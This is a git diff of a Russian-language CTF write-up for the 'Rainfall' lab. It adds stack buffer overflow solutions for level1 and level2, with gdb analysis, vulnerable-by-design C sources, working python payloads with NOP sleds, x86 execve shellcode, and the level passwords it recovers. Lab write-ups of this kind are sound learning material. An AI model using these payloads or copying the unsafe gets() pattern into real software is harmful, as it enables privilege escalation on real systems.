@@ -14,7 +14,7 @@
 # Rainfall
 Проект по изучению методов взлома и поиску уязвимостей.
 
-На платформе intra на странице проекта есть образ, который необходимо запустить на виртуальной машине и получить пароли от пользователей                               \
+На платформе intra на странице проекта есть образ, который необходимо запустить на виртуальной машине и получить пароли от пользователей     \
 level0 level1 level2 level3 level4     \
 level5 level6 level7 level8 level9     \
 bonu0 bonu1 bonu02 bonu3 end
@@ -35,8 +35,9 @@ bonu0 bonu1 bonu02 bonu3 end
 
 | Пользователь           | Уязвимость | Инструмент | Пароль от следующего пользователя  |  
 | ---------------------- | ---------- | -----------| ----------------------:|
-| [level0](#lvl0)        |  | gdb |  1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a |
-| [level1](#lvl1)        | <p>NX disabled;</p><p>использование функции gets(), наличие в коде функции system() </p> | <p>Работа со стеком. </p> <br> <p>поиск слабого места: gdb;</p> <p>взлом: переполнение буфера и подмена EIP регистра (адрес возврата из функции) для исполнения функции system() </p>| 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77 |
+| ........................... | ........................... | .................................................................................|........................................................................................................................ |
+| [level0](#lvl0)        | Выявление с помощью gdb подходящего числа для ввода | gdb |  1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a |
+| [level1](#lvl1)        | STACK CANARY: No canary found<br><br> NX: Disabled <br><br>PIE: No PIE <br><br> <p>использование функции gets(), наличие в коде функции system() </p> | <p>Работа со стеком. </p> <br> <p>поиск слабого места: gdb;</p> <p>взлом: переполнение буфера ( `gets()` ) и подмена EIP регистра (адрес возврата из функции) на адрес с нужным кодом: <br> - [адрес на system()](#level1_jump_to_system()), <br> - [положить шеллкод на стек и положить в EIP адрес шеллкода на стеке](#level1_shellcode_on_stack), <br> - [положить шеллкод в переменную окружения и положить в EIP адрес этой переменной окружения](#level1_shellcode_in_env) </p>| 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77 |
 | [level2](#lvl2)        | при ASLR off [Off-by-One](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/) (на основе кучи), можно также [Use-After-Free](https://habr.com/ru/company/otus/blog/516150/). Использование функции gets() | <p>Работа с кучей. </p> <br> ltrace, getfacl, gdb |  |
 | [level3](#lvl3)        |  |  |  |
 | [level4](#lvl4)        |  |  |  |
@@ -89,19 +90,16 @@ cat /proc/sys/kernel/randomize_va_space
 checksec --file /home/user/level0/level0
 ```
 Хорошие статьи о checksec и randomize_va_space:
-1. [о checksec --kernel
-GCC stack protector support, Strict user copy checks, Restrict /dev/mem access, Restrict /dev/kmem access, grsecurity / PaX, Kernel Heap Hardening](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/),    
+1. [о checksec --kernel](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/),    
 2. [о checksec --file и не только. RELPO, CANARY, NX, PIE](https://opensource.com/article/21/6/linux-checksec)     
 3. [о kernel.randomize_va_space (ASLR)](https://www.spec.org/cpu2017/flags/Supermicro-Platform-Settings-V1.2-Milan-revC.html) 
 4. [/proc/sys/kernel/randomize_va_space](https://www.kernel.org/doc/Documentation/sysctl/kernel.txt)
 5. [kernel.randomize_va_space (ASLR)](https://www.spec.org/cpu2017/flags/Supermicro-Platform-Settings-V1.2-Milan-revC.html)
 
-Значения некоторых механизмов защиты ядра:
-1. <a href="http://grsecurity.net/"> The grsecurity / PaX patchset is available here. </a>
-2. <a href="https://www.subreption.com/kernheap/"> The KERNHEAP hardening patchset is available here </a>
-
 Еще кое-что для чтения о взломах
-[Переполнение буфера: анатомия эксплоита](https://www.securitylab.ru/analytics/421994.php)
+1. [Переполнение буфера: анатомия эксплоита](https://www.securitylab.ru/analytics/421994.php)
+2. [Off-By-One Vulnerability (Heap Based)](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/)
+3. [Уязвимость Use-After-Free](https://habr.com/ru/company/otus/blog/516150/)
 
 <details> 
   <summary> Некоторые рассуждения о прочитанном </summary>
@@ -288,9 +286,17 @@ ltrace ./level1
 2. Использование уязвимости:
 NX disabled + No canary found + NO PIE + gets(), в которую подан аргумент при вызове программы.
 
-[ссылка о работе стека.](https://www.opennet.ru/base/dev/stack_intro.txt.html)
+Статьи по уровню:   
+ - [О работе стека.](https://www.opennet.ru/base/dev/stack_intro.txt.html)    
+ - [В королевстве PWN. Препарируем классику переполнения стека](https://snovvcrash.rocks/2019/10/20/classic-stack-overflow.html#gdb-peda)    
+ - [Создание Эксплойта: Переполнение буфера стека](https://codeby.net/threads/sozdanie-ehksplojta-perepolnenie-bufera-steka.58741/)
 
-gets() не проверяет длину поданной строки. И в этом уязвимость функции - можно переполнить буфер и положить вредоносный код (эксплоит) - в данном случае прыгнуть на system().
+gets() не проверяет длину поданной строки. И в этом уязвимость функции - можно переполнить буфер и положить вредоносный код (эксплоит) - \
+[прыгнуть на system()](#level1_jump_to_system()), \
+[положить шеллкод на стек и прыгнуть на адрес шеллкода на стеке](#level1_shellcode_on_stack), \
+[положить шеллкод в переменную окружения и прыгнуть на адрес переменной окружения](#level1_shellcode_in_env)
+
+Общее для всех трех способов взлома - подмена адреса возврата функции (регистр EIP). Подробно об этом ниже.
 
 ```sh
 gdb -batch -ex 'file ./level1' -ex 'disas main'
@@ -310,19 +316,22 @@ gdb -batch -ex 'file ./level1' -ex 'disas main'
 ```
 <details> 
   <summary> Анализ disassemble main (не обязательно к прочтению) в развороте: </summary>
-  
+<br>
+
 создается стековый фрейм (stack frame) или кадр стека: <br>
 `0x08048480 <+0>:     push   %ebp` сохраняет в стеке содержимое регистра EBP <br>
 `0x08048481 <+1>:     mov    %esp,%ebp` присваивает регистру
 EBP значение ESP <br>
-`0x08048483 <+3>:     and    $0xfffffff0,%esp` выравнивание стека по 16-байтовой границе
+`0x08048483 <+3>:     and    $0xfffffff0,%esp` выравнивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.
 
 Далее: <br>
-`0x08048486 <+6>:     sub    $0x50,%esp` резерв места для локальных переменных функции main 50<sub>16</sub> = 80<sub>10</sub> байт
+`0x08048486 <+6>:     sub    $0x50,%esp` резерв места для локальных переменных функции main 50<sub>16</sub> = 80<sub>10</sub> байт - содержит:<br> 
+возвращенное значение от `char* gets()`, то есть `char*` - 4 байта, выровненные до 16 ([Соглашение о вызове функций - выравнивание стека](https://www.cyberforum.ru/assembler-x64/thread1328915.html)) <br>
+создание буфера под 80-16=64 байта
 
 Приготовления для вызова функции gets(): <br>
-`0x08048489 <+9>:     lea    0x10(%esp),%eax` в eax помещается значение `esp+10` [(без разименования)](https://stackoverflow.com/questions/1658294/whats-the-purpose-of-the-lea-instruction), то есть адрес. <br>
-`0x0804848d <+13>:    mov    %eax,(%esp)` в gets() передается указатель. <br>
+`0x08048489 <+9>:     lea    0x10(%esp),%eax` в eax помещается значение `esp+10` [(без разименования)](https://stackoverflow.com/questions/1658294/whats-the-purpose-of-the-lea-instruction), то есть адрес на буфер в 50<sub>16</sub>-10<sub>16</sub>=40<sub>16</sub> = 64<sub>10</sub> байта (как я писала выше, 10<sub>16</sub> = 16<sub>10</sub> байт - это возвращаемое значение функцией gets(), то есть просто esp указывал бы как раз на это возвращаемое значение). <br>
+`0x0804848d <+13>:    mov    %eax,(%esp)` в gets() передается указатель на буфер в 40<sub>16</sub> = 64<sub>10</sub> байта. <br>
 `0x08048490 <+16>:    call   0x8048340 <gets@plt>` вызов gets()
 
 Последнее:
@@ -332,13 +341,36 @@ EBP значение ESP <br>
 2: `pop ebp` ebp опять принимает значение ebp вызывающей функции. <br>
 `0x08048496 <+22>:    ret    `
 инструкция ret верхнее значение стека присваивает регистру eip, [предполагая, что это сохраненный адрес возврата в вызывающую функцию, переходит по этому адресу](https://snovvcrash.rocks/2019/10/20/classic-stack-overflow.html).
+<br><br><br>
 </details>
 
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+#include "stdlib.h"
+#include "unistd.h"
+#include "stdio.h"
+#include "string.h"
+#include "sys/types.h"
+#include "sys/wait.h"
+<br>
+void  run(void) {
+        fprintf(stdout, "Good... Wait what?\n");
+        system("/bin/sh");
+}<br>
+int   main(int argc, char **argv) {
+        char buffer[64];
+        gets(buffer);
+}
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level1.c -o level1
+</details> 
+
 Интересующая строка: \
-`0x08048496 <+22>:    ret  ` \
+`0x08048496 <+22>:    ret  ` инструкция ret верхнее значение стека присваивает регистру eip \
 В соответствии с анализом, приведенным выше, надо переполнить буфер и подать нужный адрес на место, где в стеке размещался бы регистр eip. Ниже это я рассмотрю.
 
-## Разработка эксплоита:
+## Разработка эксплоита. Общее для всех трех способов  - прыжок на функцию, исполнение шеллкода на стеке, исполнение шеллкода из переменной окружения:
 1. Расчет смещения EIP (адреса возврата) \
 [Воспользуюсь сайтом.](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
 ![Получается так:](./README/level1_buf_overflow.png)
@@ -363,6 +395,10 @@ disassemble TAB
 # frame_dummy
 # ...
 ```
+
+<a name="level1_jump_to_system()"></a> 
+## level1: перейти на system()
+
 среди функций есть system().
 Если прыгнуть сразу на system(), то оболочка не откроется, так как для открытия оболочки этой функции необходим аргумент `/bin/sh`. Для вызова system() с нужным аргументом нахожу функцию, которая ее вызывает (в main не было такой). Нахожу в run:
 ```sh
@@ -435,6 +471,161 @@ cat /home/user/level2/.pass
 su level2
 # Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
+
+<a name="level1_shellcode_on_stack"></a> 
+## level1: shellcode на стеке
+
+Для shellcodes мне понравился сайт http://shell-storm.org/ . \
+На нем есть масса полезных статей по кибербезопасности и [готовые shellcodes](http://shell-storm.org/shellcode/index.html).
+
+<details> 
+  <summary> Чтобы подобрать подходящий код, я проделала шаги, указанные в развороте: </summary>
+
+1. Узнаю ОС:
+```sh
+uname -a
+# ||
+# \/
+# Linux RainFall 3.2.0-90-generic-pae #128-Ubuntu SMP Fri Aug 14 22:16:51 UTC 2015 i686 i686 i386 GNU/Linux
+```
+В данном случае 32-разрядная ОС.
+
+2. Теперь надо узнать информацию об архитектуре CPU:
+
+```sh
+lscpu
+# ||
+# \/
+# Architecture:          i686
+# CPU op-mode(s):        32-bit, 64-bit
+# Byte Order:            Little Endian
+# CPU(s):                1
+# On-line CPU(s) list:   0
+# Thread(s) per core:    1
+# Core(s) per socket:    1
+# Socket(s):             1
+# Vendor ID:             GenuineIntel
+# CPU family:            6
+# Model:                 55
+# Stepping:              8
+# CPU MHz:               2163.246
+# BogoMIPS:              4326.49
+# Virtualization:        VT-x
+# L1d cache:             24K
+# L1i cache:             32K
+# L2 cache:              1024K
+```
+Значит, мне нужен код для:  \
+Linux 32-bit                \
+Intel/x86                   \
+Этот код будет содержать execve() - запуск оболочки. <br>
+<br>
+Я выбрала:                  \
+`||`                        \
+`\/`                        \
+Intel x86                   \
+Sauder                      \
+Linux/x86 - execve() Diassembly Obfuscation Shellcode - 32 bytes by BaCkSpAcE
+<br><br><br>
+</details> 
+
+Узнаю количесвто символов на стеке после буфера, которое я могу безопасно использовать для своих целей:
+```sh
+python -c 'print "A"*76 + "B" * 4 + "C" * 72'
+# ||
+# \/
+# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+
+gdb level1
+
+(gdb)r $(python -c 'print "A"*76 + "B" * 4 + "C" * 72')
+# ||
+# \/
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x42424242 in ?? ()
+
+(gdb) x/64xw $esp-80
+# ||
+# \/
+# 0xbffff5f0:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xbffff600:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xbffff610:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xbffff620:     0x41414141      0x41414141      0x41414141      0x41414141
+# 0xbffff630:     0x41414141      0x41414141      0x41414141      0x42424242
+# 0xbffff640:     0x43434343      0x43434343      0x43434343      0x43434343
+# 0xbffff650:     0x43434343      0x43434343      0x43434343      0x43434343
+# 0xbffff660:     0x43434343      0x43434343      0x43434343      0x43434343
+# 0xbffff670:     0x43434343      0x43434343      0x43434343      0x43434343
+# 0xbffff680:     0x43434343      0x43434343      0x00000000      0x08048390
+# 0xbffff690:     0x00000000      0xb7ff26b0      0xb7e453e9      0xb7ffeff4
+# 0xbffff6a0:     0x00000001      0x08048390      0x00000000      0x080483b1
+# 0xbffff6b0:     0x08048480      0x00000001      0xbffff6d4      0x080484a0
+# 0xbffff6c0:     0x08048510      0xb7fed280      0xbffff6cc      0xb7fff918
+# 0xbffff6d0:     0x00000001      0xbffff819      0x00000000      0xbffff832
+# 0xbffff6e0:     0xbffff847      0xbffff85e      0xbffff876      0xbffff886
+
+```
+`C` выровнены начиная с адреса `0xbffff640` - это именно то место, куда будет положен shellcode и NOP-срезы.
+
+Запуск в дебаггере  кода с выводом от команды \
+`(python -c 'print "A"*76 + "\x40\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"')` \
+отработает, но оболочка откроется с правами пользователя, запустившего бинарник. Это особенность дебаггера в целях безопасности.
+
+За пределами дебаггера выполняю команду: \
+`(python -c 'print "A"*76 + "\x40\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./level1 ` \
+и оболочка не открывается, потому что я не попадаю на шелл код. Это связано с тем, что при запуске в дебаггере и без него адреса немного отличаются (разные переменные окружения, которые кладутся перед кодом программы).
+
+Подбираю правильный адрес на 16*3 байт больше, чтобы попасть на NOP-срез и проскользить до shellcode:
+```sh
+(python -c 'print "A"*76 + "\x70\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./level1 
+        whoami
+        level2
+        cat /home/user/level2/.pass
+        53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+```
+Уровень пройден!
+```sh
+su level2
+# Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+<a name="level1_shellcode_in_env"></a> 
+## level1: shellcode в env
+
+В [level1: shellcode на стеке](#level1_shellcode_on_stack) я рассматривала, как подобрать подходящий shellcode. Воспользуюсь здесь тем же кодом.
+
+Создаю переменную окружения:
+```sh
+export SHELLCODE=$'\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'
+```
+Компилирую и запускаю файл (env_addr.c):
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+        printf("%p\n", getenv("SHELLCODE"));
+        return 0;
+}
+```
+```sh
+gcc /tmp/env_addr.c -o /tmp/env_addr
+level2@RainFall:~$ /tmp/env_addr
+0xbffff868
+
+(python -c 'print "A"*76 + "\x68\xf8\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; echo "cat /home/user/level2/.pass") | ./level1 
+# ||
+# \/
+# 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+Уровень пройден!
+```sh
+su level2
+# Password: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
 #
 ###### [вернуться к содержанию](#content)
 <a name="lvl2"></a> 
@@ -562,14 +753,120 @@ main только вызывает p()
 0x08048522 <+78>:    call   0x80483d0 <_exit@plt>      
 ```
 <details> 
-  <summary> В развороте, как узнать адрес стека и почему именно 0xb0000000) </summary>
+  <summary> В развороте, как узнать адрес стека и почему именно 0xb0000000 </summary>
 
 `gdb level2`      <br>
 `b *0x08048486`   <br>
-`x/64wx $esp-132` <br>
+`x/64wx $esp-20` <br>
 эти три команды в дебагере выведут значения в стеке по конкретным адресам - все адреса на 0xb... начинаются, значит здесь нам не позволят вредоносный код в стеке выполнить.
+</details>
+<br>
 
+Для shellcodes мне понравился сайт http://shell-storm.org/ . \
+На нем есть масса полезных статей по кибербезопасности и [готовые shellcodes](http://shell-storm.org/shellcode/index.html).
 
+<details> 
+  <summary> Чтобы подобрать подходящий код, я проделала шаги, указанные в развороте: </summary>
+
+1. Узнаю ОС:
+```sh
+uname -a
+# ||
+# \/
+# Linux RainFall 3.2.0-90-generic-pae #128-Ubuntu SMP Fri Aug 14 22:16:51 UTC 2015 i686 i686 i386 GNU/Linux
+```
+В данном случае 32-разрядная ОС.
+
+2. Теперь надо узнать информацию об архитектуре CPU:
+
+```sh
+lscpu
+# ||
+# \/
+# Architecture:          i686
+# CPU op-mode(s):        32-bit, 64-bit
+# Byte Order:            Little Endian
+# CPU(s):                1
+# On-line CPU(s) list:   0
+# Thread(s) per core:    1
+# Core(s) per socket:    1
+# Socket(s):             1
+# Vendor ID:             GenuineIntel
+# CPU family:            6
+# Model:                 55
+# Stepping:              8
+# CPU MHz:               2163.246
+# BogoMIPS:              4326.49
+# Virtualization:        VT-x
+# L1d cache:             24K
+# L1i cache:             32K
+# L2 cache:              1024K
+```
+Значит, мне нужен код для:  \
+Linux 32-bit                \
+Intel/x86                   \
+Этот код будет содержать execve() - запуск оболочки. <br>
+<br>
+Я выбрала:                  \
+`||`                        \
+`\/`                        \
+Intel x86                   \
+Sauder                      \
+Linux/x86 - execve() Diassembly Obfuscation Shellcode - 32 bytes by BaCkSpAcE
+<br><br><br>
+</details> 
+
+```sh
+# http://shell-storm.org/shellcode/files/shellcode-237.html
+(echo $(python -c 'print "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1" + "\x90" * 48 + "\x08\xa0\x04\x08"'); cat) | ./level2
+# ||
+# \/
+# h̀hh��hj
+#        X1�Rh//shh/bin��RS���ᐐ�����������������������������������������
+whoami
+# ||
+# \/
+# level3
+cat /home/user/level3/.pass
+# ||
+# \/
+# 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+Уровень пройден!
+```sh
+su level3
+# Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+<details> 
+  <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
+<pre>
+
+#include "stdlib.h"
+#include "unistd.h"
+#include "stdio.h"
+#include "string.h"
+<br>
+char *p(void) {
+        char            buffer[64];
+        unsigned int    ret;
+
+        printf(""); fflush(stdout);
+        gets(buffer);
+        ret = __builtin_return_address(0);
+        if((ret & 0xb0000000) == 0xb0000000) {
+                printf("(%p)\n", ret);
+                _exit(1);
+        }
+        printf("%s\n", buffer);
+        return strdup(buffer);
+}
+<br>
+int  main(int argc, char **argv) {
+        p();
+}
+</pre>
+gcc -m32 -z execstack -Wl,-z,norelro -fno-stack-protector исходник_level2.c -o level2
+</details> 
 
 Уязвимость Use-After-Free
 https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/
